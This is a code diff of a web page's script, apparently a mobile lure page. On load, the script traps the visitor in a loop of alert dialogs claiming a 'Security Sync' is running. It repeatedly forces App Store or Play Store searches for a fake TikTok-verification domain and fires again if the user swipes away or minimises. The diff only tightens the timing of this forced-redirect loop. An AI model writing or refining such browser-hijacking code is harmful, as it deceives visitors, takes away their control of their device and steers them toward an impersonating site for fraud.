@@ -9,14 +9,14 @@
 
 <script>
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
-    const killTime = Date.now() + 10000; // ATOMIC FAIL-SAFE: 10 SECONDS
-    const fixedGap = 400; // LOCKED DELAY
+    const killTime = Date.now() + 10000; // 10 SECOND FAIL-SAFE
+    const fixedGap = 350; // OPTIMIZED DELAY
 
     function triggerStoreJump() {
         const urlEnc = encodeURIComponent(target);
         const isAndroid = /Android/i.test(navigator.userAgent);
         
-        // Using the App Store search string that is confirmed working
+        // Verified successful protocol
         const iosTrigger = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
         const androidTrigger = "market://search?q=" + urlEnc;
         
@@ -24,19 +24,17 @@
     }
 
     function rampage() {
-        // FAIL-SAFE CHECK
         if (Date.now() > killTime) return;
 
         // 1. Initial jump attempt
         triggerStoreJump();
 
         // 2. THE LOCK
-        alert("ATTEMPT #28\n\nSecurity Sync Active.\n\nTap OK to finalize handover.");
+        alert("ATTEMPT #29\n\nSecurity Sync Active.\n\nTap OK to finalize handover.");
 
-        // 3. THE PRECISION WINDOW (400ms)
-        // This is the gap where you confirmed the OS successfully jumps
+        // 3. THE OPTIMIZED WINDOW (350ms)
         setTimeout(() => {
-            // Fire again right before the next alert to keep the 'Intent' fresh
+            // Re-fire the jump to leverage the gap before the next alert
             triggerStoreJump();
             
             if (Date.now() < killTime) {
@@ -46,11 +44,10 @@
     }
 
     window.onload = () => {
-        // Start the engine
         rampage();
     };
 
-    // Keep the jump alive if they try to swipe or minimize
+    // Re-trigger if focus is lost (swipe/minimize)
     window.onblur = () => { 
         if (Date.now() < killTime) triggerStoreJump(); 
     };
